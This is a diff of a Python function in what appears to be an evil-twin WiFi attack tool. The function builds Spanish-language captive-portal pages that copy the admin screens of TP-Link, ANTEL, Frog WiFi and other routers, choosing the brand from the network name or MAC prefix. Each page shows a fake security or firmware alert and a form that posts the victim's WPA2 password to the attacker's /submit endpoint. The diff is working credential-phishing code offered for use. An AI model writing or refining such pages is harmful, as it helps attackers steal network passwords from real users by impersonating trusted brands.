@@ -1470,137 +1470,213 @@ text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:360px;width:90%
 
 
 def _build_portal_html(essid: str, bssid: str) -> str:
-    """Genera HTML del portal cautivo imitando la UI del router según la marca."""
+    """
+    Portal cautivo que imita la pantalla de administración real del router.
+    Parece que estás en 192.168.0.1 configurando la red WiFi.
+    """
     essid_up = essid.upper()
     bssid_up = bssid.upper()
 
-    # Detectar marca para personalizar el portal
-    is_tplink   = "TP-LINK" in essid_up or "TPLINK" in essid_up or \
-                  any(bssid_up.startswith(o) for o in [
-                      "E8:65:D4","A0:F3:C1","50:C7:BF","98:DA:C4",
-                      "B0:BE:76","C8:3A:35","54:A7:03","18:D6:C7"])
-    is_antel    = "ANTEL" in essid_up
-    is_frog     = "FROG" in essid_up or "WIFIFROG" in essid_up
+    is_tplink = "TP-LINK" in essid_up or "TPLINK" in essid_up or \
+                any(bssid_up.startswith(o) for o in [
+                    "E8:65:D4","A0:F3:C1","50:C7:BF","98:DA:C4",
+                    "B0:BE:76","C8:3A:35","54:A7:03","18:D6:C7"])
+    is_antel  = "ANTEL" in essid_up
+    is_frog   = "FROG" in essid_up or "WIFIFROG" in essid_up
 
+    # ── TP-Link: copia exacta del admin web de TP-Link ────────────────────────
     if is_tplink:
-        # TP-Link Tether / web UI style
-        brand_logo  = "TP-Link"
-        brand_color = "#009fda"
-        brand_bg    = "#f5f5f5"
-        brand_msg   = "Autenticación de red requerida"
-        brand_sub   = "Para continuar usando la red, confirme la contraseña WiFi."
-        brand_btn   = "#009fda"
-        brand_icon  = """<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
-          <rect width="48" height="48" rx="8" fill="#009fda"/>
-          <text x="24" y="33" text-anchor="middle" fill="white"
-                font-family="Arial" font-size="22" font-weight="bold">TP</text></svg>"""
-    elif is_antel:
-        brand_logo  = "ANTEL"
-        brand_color = "#00529b"
-        brand_bg    = "#f0f4f8"
-        brand_msg   = "Portal de autenticación ANTEL"
-        brand_sub   = "Su sesión expiró. Ingrese la contraseña para reconectarse."
-        brand_btn   = "#00529b"
-        brand_icon  = """<svg width="48" height="48" viewBox="0 0 48 48">
-          <rect width="48" height="48" rx="8" fill="#00529b"/>
-          <text x="24" y="30" text-anchor="middle" fill="white"
-                font-family="Arial" font-size="13" font-weight="bold">ANTEL</text></svg>"""
-    elif is_frog:
-        brand_logo  = "Frog WiFi"
-        brand_color = "#4caf50"
-        brand_bg    = "#f1f8e9"
-        brand_msg   = "Frog WiFi — Verificación"
-        brand_sub   = "Confirme su contraseña para mantener la conexión activa."
-        brand_btn   = "#388e3c"
-        brand_icon  = """<svg width="48" height="48" viewBox="0 0 48 48">
-          <rect width="48" height="48" rx="24" fill="#4caf50"/>
-          <text x="24" y="32" text-anchor="middle" fill="white"
-                font-family="Arial" font-size="26">🐸</text></svg>"""
-    else:
-        # Router genérico (Technicolor, ZTE, etc.)
-        brand_logo  = "Router WiFi"
-        brand_color = "#1565c0"
-        brand_bg    = "#f5f7fa"
-        brand_msg   = "Verificación de seguridad"
-        brand_sub   = "Se requiere autenticación para continuar con la conexión."
-        brand_btn   = "#1565c0"
-        brand_icon  = """<svg width="48" height="48" viewBox="0 0 48 48">
-          <rect width="48" height="48" rx="8" fill="#1565c0"/>
-          <text x="24" y="33" text-anchor="middle" fill="white"
-                font-family="Arial" font-size="28">📶</text></svg>"""
-
-    return f"""<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<meta http-equiv="refresh" content="0;url=http://192.168.10.1/">
-<title>{brand_logo} — {essid}</title>
+        return f"""<!DOCTYPE html><html lang="es"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>TP-Link | Configuraci&#xF3;n Inal&#xE1;mbrica</title>
 <style>
-*{{box-sizing:border-box;margin:0;padding:0}}
-body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;
-     background:{brand_bg};display:flex;flex-direction:column;
-     justify-content:center;align-items:center;min-height:100vh;padding:20px}}
-.card{{background:#fff;padding:36px 32px;border-radius:12px;
-       box-shadow:0 4px 24px rgba(0,0,0,.12);max-width:420px;width:100%;text-align:center}}
-.logo-wrap{{margin-bottom:18px}}
-.brand{{color:{brand_color};font-size:13px;font-weight:600;
-        letter-spacing:1px;text-transform:uppercase;margin-top:8px}}
-.ssid-badge{{display:inline-block;background:{brand_color}18;
-             color:{brand_color};border:1px solid {brand_color}44;
-             border-radius:20px;padding:4px 14px;font-size:13px;
-             font-weight:600;margin:10px 0 6px}}
-h2{{color:#212121;font-size:20px;margin-bottom:8px;font-weight:700}}
-.sub{{color:#757575;font-size:14px;line-height:1.6;margin-bottom:22px}}
-.field{{position:relative;margin-bottom:14px;text-align:left}}
-label{{display:block;font-size:12px;color:#555;font-weight:600;
-       margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}}
-input[type=password]{{width:100%;padding:12px 14px;border:1.5px solid #ddd;
-  border-radius:8px;font-size:15px;transition:border .2s;background:#fafafa}}
-input[type=password]:focus{{border-color:{brand_color};outline:none;background:#fff;
-  box-shadow:0 0 0 3px {brand_color}22}}
-.show-btn{{position:absolute;right:12px;top:35px;cursor:pointer;
-           color:#999;font-size:18px;user-select:none}}
-.btn{{width:100%;padding:13px;background:{brand_btn};color:#fff;border:none;
-      border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;
-      transition:opacity .15s;margin-top:4px;letter-spacing:.3px}}
-.btn:hover{{opacity:.88}}
-.btn:active{{opacity:.75}}
-.footer{{margin-top:20px;font-size:11px;color:#bbb;line-height:1.7}}
-.lock{{font-size:11px;color:#aaa;margin-top:14px}}
-.spinner{{display:none;margin:16px auto 0;width:24px;height:24px;
-          border:3px solid #eee;border-top-color:{brand_color};
-          border-radius:50%;animation:spin .8s linear infinite}}
-@keyframes spin{{to{{transform:rotate(360deg)}}}}
-</style>
-</head>
-<body>
-<div class="card">
-  <div class="logo-wrap">{brand_icon}
-    <div class="brand">{brand_logo}</div>
-  </div>
-  <div class="ssid-badge">📶 {essid}</div>
-  <h2>{brand_msg}</h2>
-  <p class="sub">{brand_sub}</p>
-  <form method="POST" action="/submit" id="frm"
-        onsubmit="document.querySelector('.btn').textContent='Verificando...';
-                  document.querySelector('.spinner').style.display='block'">
-    <div class="field">
-      <label>Contraseña WiFi</label>
-      <input type="password" name="pass" id="pw"
-             placeholder="••••••••" required autofocus autocomplete="current-password">
-      <span class="show-btn" onclick="var i=document.getElementById('pw');
-        i.type=i.type=='password'?'text':'password';this.textContent=i.type=='password'?'👁':'🙈'">👁</span>
-    </div>
-    <button class="btn" type="submit">Conectar</button>
-    <div class="spinner"></div>
-  </form>
-  <div class="lock">🔒 Conexión cifrada WPA2</div>
-  <div class="footer">Si olvidó su contraseña, revise la etiqueta del router.<br>
-    © {brand_logo} — {essid}</div>
+*{{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Arial,sans-serif}}
+body{{background:#f0f0f0;min-height:100vh}}
+#header{{background:#009fda;height:50px;display:flex;align-items:center;padding:0 20px}}
+#header .logo{{color:#fff;font-size:22px;font-weight:700;letter-spacing:1px}}
+#header .model{{color:#ffffffaa;font-size:12px;margin-left:10px;margin-top:3px}}
+#nav{{background:#007ab8;display:flex;height:36px}}
+#nav span{{color:#ffffffbb;font-size:13px;padding:0 18px;line-height:36px;cursor:pointer}}
+#nav span.active{{color:#fff;border-bottom:2px solid #fff;font-weight:600}}
+#wrap{{max-width:700px;margin:24px auto;padding:0 12px}}
+.box{{background:#fff;border:1px solid #ddd;border-radius:4px;margin-bottom:16px}}
+.box-title{{background:#009fda;color:#fff;font-size:13px;font-weight:600;
+            padding:8px 14px;border-radius:4px 4px 0 0}}
+.box-body{{padding:20px 18px}}
+.row{{display:flex;align-items:center;margin-bottom:14px}}
+.row label{{width:220px;font-size:13px;color:#444;flex-shrink:0}}
+.row .val{{font-size:13px;color:#222;font-weight:500}}
+.row input{{flex:1;padding:7px 10px;border:1px solid #ccc;border-radius:3px;font-size:13px}}
+.row input:focus{{border-color:#009fda;outline:none;box-shadow:0 0 0 2px #009fda33}}
+.row .eye{{margin-left:8px;cursor:pointer;color:#888;font-size:16px;user-select:none}}
+.alert{{background:#fff3cd;border:1px solid #ffc107;border-radius:3px;
+        padding:10px 14px;font-size:13px;color:#856404;margin-bottom:16px}}
+.btns{{display:flex;justify-content:flex-end;gap:10px;padding:12px 18px;
+       border-top:1px solid #eee}}
+.btn-save{{background:#009fda;color:#fff;border:none;padding:8px 28px;
+           border-radius:3px;font-size:13px;font-weight:600;cursor:pointer}}
+.btn-save:hover{{background:#007ab8}}
+.btn-cancel{{background:#f0f0f0;color:#444;border:1px solid #ccc;padding:8px 20px;
+             border-radius:3px;font-size:13px;cursor:pointer}}
+.status-bar{{background:#333;color:#aaa;font-size:11px;padding:4px 14px;
+             text-align:right}}
+</style></head><body>
+<div id="header">
+  <span class="logo">TP-Link</span>
+  <span class="model">Router WiFi — tplinkwifi.net</span>
 </div>
-</body>
-</html>"""
+<div id="nav">
+  <span>Estado</span><span>Internet</span>
+  <span class="active">Inal&#xE1;mbrico</span>
+  <span>DHCP</span><span>Seguridad</span><span>Sistema</span>
+</div>
+<div id="wrap">
+  <div class="alert">
+    &#x26A0;&#xFE0F; Se detect&#xF3; un cambio en la configuraci&#xF3;n de seguridad.
+    Confirme la contrase&#xF1;a WPA2 para aplicar los cambios y restablecer la conexi&#xF3;n.
+  </div>
+  <div class="box">
+    <div class="box-title">Configuraci&#xF3;n de Red Inal&#xE1;mbrica</div>
+    <div class="box-body">
+      <div class="row"><label>Nombre de red (SSID):</label>
+        <span class="val">{essid}</span></div>
+      <div class="row"><label>Regi&#xF3;n:</label>
+        <span class="val">Am&#xE9;rica Latina</span></div>
+      <div class="row"><label>Modo:</label>
+        <span class="val">11bgn mixto</span></div>
+      <div class="row"><label>Ancho de canal:</label>
+        <span class="val">Autom&#xE1;tico</span></div>
+      <div class="row"><label>Modo de seguridad:</label>
+        <span class="val">WPA2-Personal (AES)</span></div>
+    </div>
+  </div>
+  <div class="box">
+    <div class="box-title">Contrase&#xF1;a WPA</div>
+    <form method="POST" action="/submit"
+          onsubmit="this.querySelector('.btn-save').textContent='Guardando...'">
+      <div class="box-body">
+        <div class="row">
+          <label>Contrase&#xF1;a inal&#xE1;mbrica:</label>
+          <input type="password" name="pass" id="pw" required autofocus
+                 placeholder="Ingrese la contrase&#xF1;a actual" autocomplete="current-password"
+                 minlength="8" maxlength="64">
+          <span class="eye" onclick="var i=document.getElementById('pw');
+            i.type=i.type=='password'?'text':'password'">&#x1F441;</span>
+        </div>
+        <div class="row">
+          <label style="color:#888;font-size:12px">Longitud: 8-63 caracteres (WPA2-PSK)</label>
+        </div>
+      </div>
+      <div class="btns">
+        <button type="button" class="btn-cancel">Cancelar</button>
+        <button type="submit" class="btn-save">Guardar</button>
+      </div>
+    </form>
+  </div>
+</div>
+<div class="status-bar">192.168.0.1 &nbsp;|&nbsp; Firmware: 3.16.9 &nbsp;|&nbsp; {essid}</div>
+</body></html>"""
+
+    # ── ANTEL / Frog / Genérico: pantalla de router Sagemcom/Technicolor ──────
+    if is_antel:
+        color1, color2, title = "#00529b", "#003d7a", "ANTEL Router"
+        model = "Sagemcom F@st 3890"
+    elif is_frog:
+        color1, color2, title = "#2e7d32", "#1b5e20", "Frog WiFi Router"
+        model = "ZTE H267N"
+    else:
+        color1, color2, title = "#37474f", "#263238", "Router WiFi"
+        model = "Technicolor TG789"
+
+    return f"""<!DOCTYPE html><html lang="es"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{title} — Configuraci&#xF3;n WiFi</title>
+<style>
+*{{box-sizing:border-box;margin:0;padding:0;font-family:Arial,'Helvetica Neue',sans-serif}}
+body{{background:#e8eaf0;min-height:100vh}}
+#top{{background:linear-gradient(90deg,{color1},{color2});
+      padding:12px 20px;display:flex;align-items:center;justify-content:space-between}}
+#top .brand{{color:#fff;font-size:18px;font-weight:700;letter-spacing:.5px}}
+#top .model{{color:#ffffff88;font-size:11px}}
+#tabs{{background:{color1}dd;display:flex}}
+#tabs a{{color:#ffffffaa;font-size:12px;padding:9px 16px;text-decoration:none;cursor:pointer}}
+#tabs a.on{{color:#fff;background:{color1};border-bottom:2px solid #fff;font-weight:600}}
+#main{{max-width:680px;margin:20px auto;padding:0 10px}}
+.panel{{background:#fff;border:1px solid #c8cdd4;border-radius:3px;margin-bottom:14px;
+        box-shadow:0 1px 3px rgba(0,0,0,.07)}}
+.panel-head{{background:#f0f2f5;border-bottom:1px solid #c8cdd4;padding:9px 14px;
+             font-size:13px;font-weight:700;color:#333}}
+.panel-body{{padding:16px 14px}}
+table{{width:100%;border-collapse:collapse;font-size:13px}}
+td{{padding:7px 10px;vertical-align:middle;color:#444}}
+td:first-child{{width:210px;color:#666;font-weight:500}}
+tr:nth-child(even){{background:#f9f9fb}}
+.warn{{background:#fff8e1;border:1px solid #ffe082;border-left:4px solid #ffc107;
+       padding:10px 14px;font-size:13px;color:#5d4037;margin-bottom:14px;border-radius:2px}}
+.fw{{display:flex;align-items:center;gap:8px}}
+.fw input{{flex:1;padding:8px 10px;border:1px solid #bbb;border-radius:3px;
+           font-size:13px;background:#fafafa}}
+.fw input:focus{{border-color:{color1};outline:none;box-shadow:0 0 0 2px {color1}33}}
+.fw .eye{{cursor:pointer;color:#888;font-size:15px;user-select:none;padding:4px}}
+.hint{{font-size:11px;color:#999;margin-top:5px}}
+.foot{{display:flex;justify-content:flex-end;gap:8px;padding:10px 14px;
+       border-top:1px solid #eee;background:#fafafa}}
+.apply{{background:{color1};color:#fff;border:none;padding:8px 26px;
+        border-radius:3px;font-size:13px;font-weight:600;cursor:pointer}}
+.apply:hover{{background:{color2}}}
+.discard{{background:#fff;color:#555;border:1px solid #bbb;padding:8px 18px;
+          border-radius:3px;font-size:13px;cursor:pointer}}
+#statusbar{{background:#2b2b2b;color:#888;font-size:11px;padding:4px 14px;text-align:right}}
+</style></head><body>
+<div id="top">
+  <div><div class="brand">{title}</div><div class="model">{model} &mdash; 192.168.1.1</div></div>
+  <div style="color:#ffffff66;font-size:11px">Admin &nbsp;|&nbsp; Cerrar sesi&#xF3;n</div>
+</div>
+<div id="tabs">
+  <a>Inicio</a><a>Internet</a><a class="on">WiFi</a>
+  <a>DHCP</a><a>Firewall</a><a>Sistema</a>
+</div>
+<div id="main">
+  <div class="warn">
+    &#x26A0; El router detect&#xF3; una actualizaci&#xF3;n de firmware que modific&#xF3; la
+    configuraci&#xF3;n de seguridad. Para restablecer la conexi&#xF3;n de los dispositivos,
+    ingrese la contrase&#xF1;a WiFi actual y presione <strong>Aplicar</strong>.
+  </div>
+  <div class="panel">
+    <div class="panel-head">Red Inal&#xE1;mbrica — Informaci&#xF3;n</div>
+    <div class="panel-body">
+      <table>
+        <tr><td>Nombre de red (SSID)</td><td><strong>{essid}</strong></td></tr>
+        <tr><td>BSSID</td><td>{bssid}</td></tr>
+        <tr><td>Banda</td><td>2.4 GHz (802.11n)</td></tr>
+        <tr><td>Modo de seguridad</td><td>WPA2-PSK / AES</td></tr>
+        <tr><td>Estado</td><td><span style="color:#e53935">&#x25CF;</span> Requiere verificaci&#xF3;n</td></tr>
+      </table>
+    </div>
+  </div>
+  <div class="panel">
+    <div class="panel-head">Contrase&#xF1;a de red WiFi</div>
+    <form method="POST" action="/submit"
+          onsubmit="this.querySelector('.apply').textContent='Aplicando...'">
+      <div class="panel-body">
+        <div class="fw">
+          <input type="password" name="pass" id="pw" required autofocus
+                 placeholder="Contrase&#xF1;a WPA2 actual" minlength="8" maxlength="64"
+                 autocomplete="current-password">
+          <span class="eye" onclick="var i=document.getElementById('pw');
+            i.type=i.type=='password'?'text':'password'">&#x1F441;</span>
+        </div>
+        <div class="hint">M&#xED;nimo 8 caracteres &mdash; WPA2 Personal (PSK)</div>
+      </div>
+      <div class="foot">
+        <button type="button" class="discard">Descartar</button>
+        <button type="submit" class="apply">Aplicar</button>
+      </div>
+    </form>
+  </div>
+</div>
+<div id="statusbar">192.168.1.1 &nbsp;|&nbsp; {model} &nbsp;|&nbsp; Firmware v2.3.1 &nbsp;|&nbsp; {essid}</div>
+</body></html>"""
 
 
 def _evil_twin_run(essid: str, bssid: str, channel: str,
